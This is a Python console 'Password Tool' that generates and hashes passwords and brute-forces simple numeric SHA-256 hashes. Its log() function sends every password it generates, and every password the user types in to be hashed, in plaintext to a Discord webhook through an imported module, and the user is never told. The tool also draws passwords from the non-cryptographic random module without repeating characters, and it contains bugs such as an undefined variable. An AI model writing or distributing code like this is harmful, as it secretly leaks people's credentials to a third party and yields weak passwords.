# set varibles
lower = "abcdefghijklmnopqrstuvwxyz"
upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
numbers = "1234567890"
symbols = "!@#$%&*_=?"
n = "\n"
use = [lower,]

# imports modules 

import json
import random
import os
import time
import hashlib
import colorama
from colorama import Fore
import webhook
import safety_check

def log(pas, Safety=None):
    # log password to a discord webhook using module
    if Safety == True:
        color = "AAFF00"
    else:
        color = "FF0000"
    webhook.main(f"logs", f"""
    Logged password: {pas}
    Safe: {Safety}
    """, color)
    
# functions
def main():
    # call intro function
    intro()

    # call the function to get length
    length = get_length()


    # call function to ask if generating multiple passwords if yes ask how many to generate
    multiple = multiple_passwords()
    if multiple == "yes":
        repeat = multiple_times()
    clear()


    # call function to see if using use upper case and lower case
    capital = use_caps()

    # call function to see if using symbols
    symbol = use_symbols()

    # call function to see if using numbers
    number = use_numbers()

    # call function to see if checking with pwned api
    check = use_checks()

    # calls the setting function
    try:
        setting_print(length,multiple,capital,symbol,number,check,repeat)
    except:
        setting_print(length,multiple,capital,symbol,number,check)



    # calls function rand and gets a random number to base generation off, dosent do anything yet
    random_factor = rand()
    print(n,Fore.GREEN + f" Randomization factor: {random_factor}",n, " Hash Type: Sha256")

    # calculates password
    try:
        generation(length, check, repeat)

    # if the user dose not use more than one password to generate this handles the error
    except NameError:
        error(length,check)


def clear():
        os.system("cls")

def rand():
    number = random.randrange(1,12)
    return number

def hash(pas):
    os.system("cls")
    hashed = hashlib.sha256(pas.encode('utf-8')).hexdigest()
    orginal = pas
    print(n,Fore.GREEN, "Hash Type: Sha256",n, Fore.BLUE , f"Original Password: {orginal}",n,Fore.RED , f"Hashed Password: {hashed}", n, Fore.RESET)
    log(orginal)
    exit()

# function that cracks a givin hash
def hashcrack():
    correct_password_hash = input("Whats the hash: ")
    for i in range(99999):
        i = str(i)
        password =  hashlib.sha256(i.encode('utf-8')).hexdigest()
            # prints password and hash resets colors
        print(Fore.RED + f"Trying hash: {password}")
        print(Fore.BLUE + f"Trying hash: {password}")
        if correct_password_hash == password:
            print(Fore.GREEN + f"Hash Cracked: {i}")
            print(Fore.RESET)
            exit()
        
def error(length,check=None):
# generates password if try fails, exeption handling
    string = "".join(use)
    password = "".join(random.sample(string, length))
    hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
# prints password and hash resets colors
    print(Fore.BLUE + f"  Password: {password}")
    print(Fore.RED + f"  Password Hash: {hashed}")
    if check == "yes":
        safe = safety_check.main(password)
    else:
        pass
    log(password, safe)
    print(Fore.RESET)


def generation(length,check,repeat):
# generate more than one passwords
        while repeat != 0:
            repeat = repeat - 1
            string = "".join(use)
            password = "".join(random.sample(string, length))
            hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
          #  store(password, hashed)
# prints password and hash resets colors
            print(Fore.BLUE + f"  Password: {password}")
            print(Fore.RED + f"  Password Hash: {hashed}")
            
            if check == "yes":
                safe = safety_check.main(password)
            else:
                continue
            log(password, safe)
            print(Fore.RESET,n)
            time.sleep(0)


# writes password and password hash to a file called stored passwords
def store(password, hashed):
    password = password
    password_hash = hashed

    def write_json(data, filename="stored_password.json"):
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
            
    with open("stored_password.json") as json_file:
        data = json.load(json_file)
        temp = data["user_information"]
        x = {"pass" : password, "hash" : password_hash}
        temp.append(x)
    write_json(data)


# prints settings
def setting_print(length,multiple,capital,symbol,number,check,repeat=None):
    x = 6
    while x != 0:
        
        settings = [f"Password length: {length}",n, f"Generate multiple passwords: {multiple}",n, f"Number of passwords to generate: ", repeat if multiple == "yes" else "0",n, f"Use capital letters: {capital}",n, f"Use symbols: {symbol}",n, f"Use numbers: {number}",n, f"Check password with pwned api: {check}"]
        print(f"Your settings: {n}{str().join(map(str, settings))}")
        print(f"Continuing {x} seconds")
        x = x - 1
        time.sleep(1) 
        clear()

# asks if user wants to hash password or generate
def intro():
    for i in range(0,100):
        while True:
            try:
                clear()
                print(Fore.RED + """
  ___                              _   _____         _ 
 | _ \__ _ _______ __ _____ _ _ __| | |_   _|__  ___| |
 |  _/ _` (_-<_-< V  V / _ \ '_/ _` |   | |/ _ \/ _ \ |
 """+Fore.BLUE+"""|_| \__,_/__/__/\_/\_/\___/_| \__,_|   |_|\___/\___/_|
"""+Fore.RESET+"""
    ["""+Fore.BLUE+"1"+Fore.RESET+"""] Hash A Password
    ["""+Fore.BLUE+"2"+Fore.RESET+"""] Generate a password   
    ["""+Fore.BLUE+"3"+Fore.RESET+"""] Crack a hash                                                    
               """ )
                print(Fore.CYAN + "> ", end="")
                option = int(input(Fore.RESET))
                if option == 1:
                    clear()
                    user_password = input("Enter password: ")
                    hash(user_password)
                elif option == 3:
                    clear()
                    hashcrack()
                    exit()
                else: 
                        clear()
                        print("Welcome, answer the following questions using a numarical value, or Yes or No.")
                        time.sleep(3)
                        clear()
                        return
            except ValueError:
                        print("Please enter a integer")
            continue
            break



# gets the length
def get_length():
    for i in range(0,100):
        while True:
            try:
                length = int(input("Password Length: "))
                if isinstance(length, int) and length <= 68 and length >0:
                    clear()
                    return length
                else:
                    print("Max length is 68.")
            except ValueError:
                        print("Please enter a integer.")
            continue
            break


# find if user wants more than 1
def multiple_passwords():
    for i in range(0,100):
        while True:
            try:
                multiple = str(input("Generate more than one password: ")).lower().strip()
                if multiple == "yes":
                    clear()
                    return multiple
                else: 
                    clear()
                    return multiple.replace(multiple, "no")
            except ValueError:
                        print("Please input a string")
            continue
            break

# finds number of times to get pass
def multiple_times():
    for i in range(0,100):
        while True:
            try:
                repeat = int(input("Input number of passwords to generate: "))
                if isinstance(repeat, int):
                    clear()
                    return repeat
            except ValueError:
                        print("Please enter a integer.")
            continue
            break

# ask if use caps
def use_caps():
    for i in range(0,100):
        while True:
            try:
                capital = input("Use uppercase and lowercase letters? ").lower().strip()
                if capital == "yes":
                    clear()
                    use.append(upper)
                    return capital
                else: 
                    clear()
                    return capital.replace(capital, "no")
            except ValueError:
                        print("Please input a string")
            continue
            break	
	

# ask if use symbols
def use_symbols():
    for i in range(0,100):
        while True:
            try:
                symbol = input("Use symbols? ").lower().strip()
                if symbol == "yes":
                    clear()
                    use.append(symbols)
                    return symbol
                else: 
                    clear()
                    return symbol.replace(symbol, "no")
            except ValueError:
                        print("Please input a string")
            continue
            break	

def use_numbers():
    for i in range(0,100):
        while True:
            try:
                number = input("Use numbers? ").lower().strip()
                if number == "yes":
                    clear()
                    use.append(numbers)
                    return number
                else: 
                    clear()
                    return number.replace(number, "no")
            except ValueError:
                        print("Please input a string")
            continue
            break	

def use_checks():
    for i in range(0,100):
        while True:
            try:
                check = input("Do you want to check if the password is sucure using pwned api? ").lower().strip()
                if check == "yes":
                    clear()
                    return check
                else: 
                    clear()
                    return check.replace(check, "no")
            except ValueError:
                        print("Please input a string")
            continue
            break	

main()